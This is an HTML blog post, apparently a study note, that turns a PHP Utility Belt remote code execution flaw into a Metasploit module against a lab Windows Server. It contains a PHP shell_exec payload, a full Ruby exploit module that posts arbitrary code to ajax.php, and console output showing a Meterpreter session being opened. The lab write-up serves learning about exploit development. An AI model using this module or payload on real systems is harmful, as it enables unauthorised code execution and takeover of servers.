@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="将基于 Web 的 RCE 导入 Metasploit">
+<meta property="og:url" content="https://z9m8r8.github.io/2021/12/01/%E5%B0%86%E5%9F%BA%E4%BA%8E%20Web%20%E7%9A%84%20RCE%20%E5%AF%BC%E5%85%A5%20Metasploit/index.html">
+<meta property="og:site_name" content="Ghost&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-12-01T01:15:00.000Z">
+<meta property="article:modified_time" content="2023-12-12T06:26:51.030Z">
+<meta property="article:author" content="Ghost">
+<meta property="article:tag" content="Metasploit">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2021/12/01/%E5%B0%86%E5%9F%BA%E4%BA%8E%20Web%20%E7%9A%84%20RCE%20%E5%AF%BC%E5%85%A5%20Metasploit/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2021/12/01/%E5%B0%86%E5%9F%BA%E4%BA%8E%20Web%20%E7%9A%84%20RCE%20%E5%AF%BC%E5%85%A5%20Metasploit/","path":"2021/12/01/将基于 Web 的 RCE 导入 Metasploit/","title":"将基于 Web 的 RCE 导入 Metasploit"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>将基于 Web 的 RCE 导入 Metasploit | Ghost's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Ghost's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">1. 实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%86-http-%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5%E5%88%B0-metasploit-%E4%B8%AD"><span class="nav-text">2. 将 HTTP 渗透模块导入到
+Metasploit 中</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E4%BB%A3%E7%A0%81"><span class="nav-text">1、渗透代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90"><span class="nav-text">2、代码简要分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E5%AD%98%E8%B7%AF%E5%BE%84"><span class="nav-text">3、保存路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95"><span class="nav-text">4、代码调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A5%E5%85%85"><span class="nav-text">5、补充</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf-%E8%BF%90%E8%A1%8C%E6%B5%8B%E8%AF%95"><span class="nav-text">3. msf 运行测试</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ghost"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ghost</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">111</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">49</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2021/12/01/%E5%B0%86%E5%9F%BA%E4%BA%8E%20Web%20%E7%9A%84%20RCE%20%E5%AF%BC%E5%85%A5%20Metasploit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ghost">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ghost's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="将基于 Web 的 RCE 导入 Metasploit | Ghost's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          将基于 Web 的 RCE 导入 Metasploit
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-01 09:15:00" itemprop="dateCreated datePublished" datetime="2021-12-01T09:15:00+08:00">2021-12-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-12-12 14:26:51" itemprop="dateModified" datetime="2023-12-12T14:26:51+08:00">2023-12-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%B2%BE%E9%80%9AMetasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%AC%AC2%E7%89%88/" itemprop="url" rel="index"><span itemprop="name">精通Metasploit渗透测试 第2版</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="实验环境">1. 实验环境</h2>
+<p><strong>攻击机：kali 2019-3</strong></p>
+<p><strong>靶机环境：</strong></p>
+<p>Windows Server2008 R2 x64</p>
+<p><strong>phpStudy 2016 PHP-5.4.45</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211201084936234-1908912077.png" /></p>
+<p><strong>漏洞：</strong></p>
+<p><strong>PHP utility belt远程代码执行漏洞</strong> ，可参见：<a
+target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/38901"
+class="uri">https://www.exploit-db.com/exploits/38901</a></p>
+<p><strong>漏洞简要介绍</strong></p>
+<p>这个远程代码执行漏洞通过一个POST请求的代码参数触发，服务器在接收到这段精心构造的数据请求并对其进行处理之时就会执行服务器端代码。现在来看看如何对这个漏洞进行手动渗透。</p>
+<p>使用fwrite以可写模式打开名为info.php的文件，然后将</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span> = <span class="string">&quot;net user&quot;</span>; <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$a</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>写入到文件中</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211201085025516-1909489006.png" /></p>
+<p>命令执行之后，将会创建一个名为info.php的新文件，并将PHP中的信息写入到这个文件中。接下来，只需浏览info.php文件，就可以看到执行命令的结果</p>
+<p><strong>文件夹中创建了info.php</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211201085039541-344520801.png" /></p>
+<p><strong>浏览器访问info.php,该页面列出了所有用户名</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211201085052766-724902179.png" /></p>
+<h2 id="将-http-渗透模块导入到-metasploit-中">2. 将 HTTP 渗透模块导入到
+Metasploit 中</h2>
+<h3 id="渗透代码">1、渗透代码</h3>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt;<span class="title class_">Msf</span><span class="symbol">:</span><span class="symbol">:Exploit</span><span class="symbol">:</span><span class="symbol">:Remote</span></span><br><span class="line"><span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::HttpClient</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info=&#123;&#125;</span>)</span><br><span class="line">  <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;PHP Utility Belt Remote Code Execution&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span> =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">          This module exploits a remote code execution vulnerability in PHP Utility Belt</span></span><br><span class="line"><span class="string">        &#125;</span>,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span> =&gt; <span class="string">&#x27;z9m8r8&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&#x27;2021-10-03&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;PHP&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Payload&#x27;</span> =&gt; &#123;</span><br><span class="line">        <span class="string">&#x27;Space&#x27;</span> =&gt; <span class="number">2000</span>,</span><br><span class="line">        <span class="string">&#x27;DisableNops&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&#x27;Targets&#x27;</span> =&gt; [</span><br><span class="line">        [<span class="string">&#x27;PHP Utility Belt&#x27;</span>,&#123;&#125;]</span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="number">0</span></span><br><span class="line">    ))</span><br><span class="line">  register_options(</span><br><span class="line">    [</span><br><span class="line">      <span class="title class_">OptString</span>.new(<span class="string">&#x27;TARGETURI&#x27;</span>,[<span class="literal">true</span>,<span class="string">&#x27;The path to PHP Utility Belt&#x27;</span>,<span class="string">&#x27;php-utility-belt/ajax.php&#x27;</span>]),</span><br><span class="line">      <span class="title class_">OptString</span>.new(<span class="string">&#x27;CHECKURI&#x27;</span>,[<span class="literal">false</span>,<span class="string">&#x27;Checking Purpose&#x27;</span>,<span class="string">&#x27;/php-utilitybelt/info.php&#x27;</span>]),</span><br><span class="line">    ],<span class="variable language_">self</span>.<span class="keyword">class</span></span><br><span class="line">  )</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span></span><br><span class="line">  send_request_cgi(</span><br><span class="line">    <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),</span><br><span class="line">    <span class="string">&#x27;vars_post&#x27;</span> =&gt; &#123;</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span> =&gt; <span class="string">&quot;fwrite(fopen(&#x27;info.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php echo phpinfo();?&gt;&#x27;);&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  )</span><br><span class="line">  resp = send_request_raw(</span><br><span class="line">    &#123;<span class="string">&#x27;uri&#x27;</span> =&gt; normalize_uri(datastore[<span class="string">&#x27;CHECKURI&#x27;</span>]),<span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;GET&#x27;</span>&#125;)</span><br><span class="line">  <span class="keyword">if</span> resp.body =~ <span class="regexp">/phpinfo()/</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Exploit</span><span class="symbol">:</span><span class="symbol">:CheckCode</span><span class="symbol">:</span><span class="symbol">:Vulnerable</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Exploit</span><span class="symbol">:</span><span class="symbol">:CheckCode</span><span class="symbol">:</span><span class="symbol">:Safe</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span> </span><br><span class="line">  send_request_cgi(</span><br><span class="line">    <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),</span><br><span class="line">    <span class="string">&#x27;vars_post&#x27;</span> =&gt; &#123;</span><br><span class="line">      <span class="string">&#x27;code&#x27;</span> =&gt; payload.encoded</span><br><span class="line">    &#125;</span><br><span class="line">  )</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<h3 id="代码简要分析">2、代码简要分析</h3>
+<p><strong>因为现在的漏洞在一个Web应用程序中，而不是在之前的那种软件程序中，所以要将DisableNops的值设置为true以关闭攻击载荷中的NOP</strong></p>
+<p><strong>漏洞在ajax.php文件中，因此要将TARGETURI的值设置为ajax.php文件的位置。</strong></p>
+<p><strong>check 函数</strong></p>
+<ul>
+<li>将URI的值设置为以普通格式表示的目标URI</li>
+<li>POST的参数CODE的值为fwrite(fopen('info.php','w'),'<?php echo phpinfo();?>');。</li>
+<li>攻击载荷将会创建一个名为info.php的新文件。当代码执行的时候，这个文件将会展示所有的PHP信息。</li>
+<li>使用send_request_raw获取新创建的info.php文件的内容</li>
+<li>将保存在resp中的body部分与表达式phpinfo()匹配比较，评判漏洞是否有效</li>
+</ul>
+<p><strong>exploit 函数分析同理</strong></p>
+<h3 id="保存路径">3、保存路径</h3>
+<pre><code>root@kali:/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test# ls
+pcman_cwd_z9m8r8_test.rb php_utility_belt_remote_code_execution.rb</code></pre>
+<h3 id="代码调试">4、代码调试</h3>
+<pre><code>root@kali:/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test# ../../../../tools/dev/msftidy.rb php_utility_belt_remote_code_execution.rb
+php_utility_belt_remote_code_execution.rb - [INFO] No CVE references found. Please check before you land!
+php_utility_belt_remote_code_execution.rb - [ERROR] Unable to determine super class　　#未搞明白！但也没影响到获取Meterpreter
+php_utility_belt_remote_code_execution.rb:48 - [WARNING] Spaces at EOL</code></pre>
+<p><strong>报错未解决，有会的老哥可评论说下，非常感谢！</strong></p>
+<h3 id="补充">5、补充</h3>
+<p>在用Metasploit开发基于Web的渗透程序时，最重要的就是要弄清楚相关的Web函数、使用这些函数的方法，这些函数的参数以及知道漏洞的确切位置（该示例中的漏洞所在位置是CODE参数处）。</p>
+<p>Web应用程序使用的重要函数都可以在/usr/share/metasploit-
+framework/lib/msf/core/exploits/http下的client.rb库文件中找到。另外，在/usr/share/metasploit-
+framework/lib/rex/proto/http下的client.rb文件和client-
+request.rb文件包含着关于GET和POST请求的核心变量和方法。</p>
+<p>如果想知道都需要将哪些值传递给这些函数，就需要对REX中的库文件进行研究。
+REX库文件提供了与请求类型相关的下列头文件，如下图所示。</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211201090548227-1269470317.png" /></p>
+<h2 id="msf-运行测试">3. msf 运行测试</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf5 &gt; use exploit/windows/z9m8r8_test/php_utility_belt_remote_code_execution </span><br><span class="line">msf5 exploit(windows/z9m8r8_test/php_utility_belt_remote_code_execution) &gt; <span class="built_in">set</span> payload php/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; php/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(windows/z9m8r8_test/php_utility_belt_remote_code_execution) &gt; <span class="built_in">set</span> rhost 10.10.10.140</span><br><span class="line">rhost =&gt; 10.10.10.140 msf5 exploit(windows /z9m8r8_test/php_utility_belt_remote_code_execution) &gt;check</span><br><span class="line"> [*] 10.10.10.140:80 - The target is not exploitable.　　　　　　　　　　　　　　　　　　<span class="comment">#check函数那个匹配有问题，懒得改了，明白思路即可</span></span><br><span class="line">msf5 exploit(windows/z9m8r8_test/php_utility_belt_remote_code_execution) &gt;exploit </span><br><span class="line"></span><br><span class="line">[*] Started <span class="built_in">bind</span> TCP handler against 10.10.10.140:4444</span><br><span class="line">[*] Sending stage (38247 bytes) to 10.10.10.140</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.10.152:46353 -&gt; 10.10.10.140:4444) at 2021-10-02 22:15:27 -0400 meterpreter &gt;sysinfo </span><br><span class="line">Computer: WIN-GOFSH0NNHLM</span><br><span class="line">OS  : Windows NT WIN-GOFSH0NNHLM 6.1 build 7601 (Windows Server 2008 R2 Enterprise Edition Service Pack 1) i586</span><br><span class="line">Meterpreter : php/windows</span><br><span class="line">   meterpreter&gt; </span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Ghost
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2021/12/01/%E5%B0%86%E5%9F%BA%E4%BA%8E%20Web%20%E7%9A%84%20RCE%20%E5%AF%BC%E5%85%A5%20Metasploit/" title="将基于 Web 的 RCE 导入 Metasploit">https://z9m8r8.github.io/2021/12/01/将基于 Web 的 RCE 导入 Metasploit/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Metasploit/" rel="tag"><i class="fa fa-tag"></i> Metasploit</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/11/30/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F/" rel="prev" title="主动信息收集之服务扫描">
+                  <i class="fa fa-angle-left"></i> 主动信息收集之服务扫描
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/12/01/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%86%E5%88%AB/" rel="next" title="主动信息收集之操作系统识别">
+                  主动信息收集之操作系统识别 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ghost</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">187k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">11:19</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
